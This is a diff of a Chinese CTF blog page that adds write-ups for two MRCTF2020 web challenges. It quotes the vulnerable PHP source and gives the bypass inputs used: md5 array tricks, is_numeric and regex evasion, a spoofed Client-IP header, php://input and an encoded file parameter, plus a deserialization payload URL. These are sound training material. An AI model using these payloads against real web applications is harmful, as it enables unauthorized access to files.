@@ -77,7 +77,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-quill-pen-line"></i>
             <span class="post-meta-item-text"> Word count:</span>
-            <span class="post-count">841</span>
+            <span class="post-count">1.4k</span>
         </span>
     </span>
 
@@ -86,7 +86,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-book-open-line"></i>
             <span class="post-meta-item-text"> Reading time≈</span>
-            <span class="post-count">4 min</span>
+            <span class="post-count">7 min</span>
         </span>
     </span>
 </div>
@@ -183,6 +183,47 @@
 <p><img src="/2020/11/04/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2021.5.24/2.png" alt="2"></p>
 <p><a target="_blank" rel="noopener" href="http://cb05b76c-5a4d-493d-b445-e9e887b65582.node3.buuoj.cn/?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;&amp;file=useless.php&amp;&amp;password=O:4:&quot;Flag&quot;:1:%7Bs:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;%7D">http://cb05b76c-5a4d-493d-b445-e9e887b65582.node3.buuoj.cn/?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;&amp;file=useless.php&amp;&amp;password=O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}</a></p>
 <p>F12获得flag</p>
+<h2 id="MRCTF2020-Ez-bypass"><a href="#MRCTF2020-Ez-bypass" class="headerlink" title="[MRCTF2020]Ez_bypass"></a>[MRCTF2020]Ez_bypass</h2><ul>
+<li>2021.7.21</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">I put something in F12 for you</span><br><span class="line">include &#39;flag.php&#39;;</span><br><span class="line">$flag&#x3D;&#39;MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;&#39;;</span><br><span class="line">if(isset($_GET[&#39;gg&#39;])&amp;&amp;isset($_GET[&#39;id&#39;])) &#123;</span><br><span class="line">    $id&#x3D;$_GET[&#39;id&#39;];</span><br><span class="line">    $gg&#x3D;$_GET[&#39;gg&#39;];</span><br><span class="line">    if (md5($id) &#x3D;&#x3D;&#x3D; md5($gg) &amp;&amp; $id !&#x3D;&#x3D; $gg) &#123;</span><br><span class="line">        echo &#39;You got the first step&#39;;</span><br><span class="line">        if(isset($_POST[&#39;passwd&#39;])) &#123;</span><br><span class="line">            $passwd&#x3D;$_POST[&#39;passwd&#39;];</span><br><span class="line">            if (!is_numeric($passwd))</span><br><span class="line">            &#123;</span><br><span class="line">                 if($passwd&#x3D;&#x3D;1234567)</span><br><span class="line">                 &#123;</span><br><span class="line">                     echo &#39;Good Job!&#39;;</span><br><span class="line">                     highlight_file(&#39;flag.php&#39;);</span><br><span class="line">                     die(&#39;By Retr_0&#39;);</span><br><span class="line">                 &#125;</span><br><span class="line">                 else</span><br><span class="line">                 &#123;</span><br><span class="line">                     echo &quot;can you think twice??&quot;;</span><br><span class="line">                 &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            else&#123;</span><br><span class="line">                echo &#39;You can not get it !&#39;;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            die(&#39;only one way to get the flag&#39;);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        echo &quot;You are not a real hacker!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    die(&#39;Please input first&#39;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;Please input first</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<ol>
+<li><p><code>md5($id) === md5($gg) &amp;&amp; $id !== $gg</code>   php强比较绕过</p>
+</li>
+</ol>
+<p><code>id[]=1&amp;gg[]=2</code>，传入数组，虽然会报错但md5返回结果为空，NULL=NULL绕过md5，</p>
+<ol start="2">
+<li>is_numeric()函数用1234567a绕过，1234567a会被当做字符串，转换整型时候把a去掉</li>
+</ol>
+<p>##[MRCTF2020]套娃1</p>
+<ul>
+<li>2020.7.21</li>
+</ul>
+<p><img src="/2020/11/04/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2021.7.21/image-20210721161850938.png" alt="image-20210721161850938"></p>
+<p><code>$_SERVER[&#39;QUERY_STRING&#39;]</code>可以获得我们传的参数变量和值，如下解释：</p>
+<p><img src="/2020/11/04/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2021.7.21/image-20210721162009856.png" alt="image-20210721162009856"></p>
+<p><code>%20</code>代替<code>_</code>绕过第一个if检测(查询字符串在解析的过程中会将空白符删除或用将某些字符转换为下划线（包括<code>空格</code>，<code>[</code>）)   或者用<code>%5F</code>代替<code>_</code></p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/213359.html">参考</a></p>
+<p><code>%0a</code>绕过第二个正则（超级实用）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?b%20u%20p%20t&#x3D;23333%0a</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/11/04/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2021.7.21/image-20210723151026286.png" alt="image-20210723151026286"></p>
+<p>jsfuck加密</p>
+<p><img src="/2020/11/04/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2021.7.21/image-20210723151432092.png" alt="image-20210723151432092"></p>
+<p>复制到控制台</p>
+<p><img src="/2020/11/04/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2021.7.21/image-20210723151501201.png" alt="image-20210723151501201"></p>
+<p>随便post   Merak一个值</p>
+<p><img src="/2020/11/04/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2021.7.21/image-20210723160659019.png" alt="image-20210723160659019"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">Flag is here~But how to get it? </span><br><span class="line"> <span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;takeip.php&#x27;</span>;</span><br><span class="line">ini_set(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;.&#x27;</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;Merak&#x27;</span>]))&#123; </span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>); </span><br><span class="line">    <span class="keyword">die</span>(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">change</span>(<span class="params"><span class="variable">$v</span></span>)</span>&#123; </span><br><span class="line">    <span class="variable">$v</span> = base64_decode(<span class="variable">$v</span>); </span><br><span class="line">    <span class="variable">$re</span> = <span class="string">&#x27;&#x27;</span>; </span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;strlen(<span class="variable">$v</span>);<span class="variable">$i</span>++)&#123; </span><br><span class="line">        <span class="variable">$re</span> .= chr ( ord (<span class="variable">$v</span>[<span class="variable">$i</span>]) + <span class="variable">$i</span>*<span class="number">2</span> ); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$re</span>; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Local access only!&#x27;</span>.<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$ip</span> = getIp();</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ip</span>!=<span class="string">&#x27;127.0.0.1&#x27;</span>)</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Sorry,you don&#x27;t have permission!  Your ip is :&quot;</span>.<span class="variable">$ip</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ip</span> === <span class="string">&#x27;127.0.0.1&#x27;</span> &amp;&amp; file_get_contents(<span class="variable">$_GET</span>[<span class="string">&#x27;2333&#x27;</span>]) === <span class="string">&#x27;todat is a happy day&#x27;</span> )&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Your REQUEST is:&quot;</span>.change(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> file_get_contents(change(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])); &#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+
+<p>xff不行，用client-ip:127.0.0.1</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?2333&#x3D;php:&#x2F;&#x2F;input</span><br><span class="line"></span><br><span class="line">todat is a happy day</span><br></pre></td></tr></table></figure>
+
+<p>file 需要写个解密poc</p>
+<p><img src="/2020/11/04/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2021.7.21/image-20210724015309274.png" alt="image-20210724015309274"></p>
+<p>file=ZmpdYSZmXGI=</p>
+<p><img src="/2020/11/04/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2021.7.21/image-20210724015407359.png" alt="image-20210724015407359"></p>
  
       <!-- reward -->
       
